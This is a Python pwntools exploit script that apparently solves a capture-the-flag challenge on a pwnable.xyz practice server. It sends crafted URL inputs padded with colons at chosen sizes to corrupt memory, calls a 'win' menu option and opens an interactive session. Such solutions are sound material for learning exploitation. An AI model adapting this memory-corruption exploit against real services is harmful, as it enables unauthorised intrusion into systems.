from pwn import *
#target=process('./challenge')
target=remote('svc.pwnable.xyz',30021)

def init(option):
	print(target.recvuntil("> "))
	target.sendline(str(option))

def password(password):
	init(1)
	print(target.recvuntil(": "))
	target.sendline(str(password))
	
def create(url,size,data):
	init(2)
	print(target.recvuntil(": "))
	target.send("http"+url)
	print(target.recvuntil(": "))
	target.sendline(str(size))
	time.sleep(0.1)
	target.send(data)

def leak():
	init(3)
	print(target.recvuntil(": "))
	leak=target.recvline().strip("\n")
	return leak

def win():
	init(4)
	
create("s::::",0x7f,":"*0x7f)
create("s::::",0x7f,":"*0x7f)
create("s::::",0x9,":"*0x9)
win()
target.interactive()

	
	
	
